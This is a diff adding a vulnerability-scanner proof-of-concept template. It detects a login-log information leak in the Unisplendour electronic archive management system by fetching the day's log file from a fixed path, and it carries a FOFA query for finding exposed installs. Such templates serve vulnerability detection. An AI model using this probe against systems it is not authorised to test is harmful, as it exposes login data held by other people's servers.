@@ -1,0 +1,36 @@
+id: poc-yaml-thams-login-logs-info-leak
+info:
+  name: 紫光电子档案管理系统 login 日志信息泄露漏洞
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: 信息泄露
+  metadata:
+    finger: 紫光电子档案管理系统
+    fofa: app="紫光档案管理系统"
+variables:
+  path: "{{date_time('%y_%m_%d')}}"
+  time: "{{date_time('2006-01-02')}}"
+http:
+  - method: GET
+    path:
+      - "/Application/Runtime/Logs/login/{{path}}.log"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "KEY:"
+          - "URL:"
+          - "RunTime:0"
+      - type: word
+        part: body
+        words:
+          - "{{time}}"
+      - type: word
+        part: header
+        words:
+          - "html"
+        negative: true
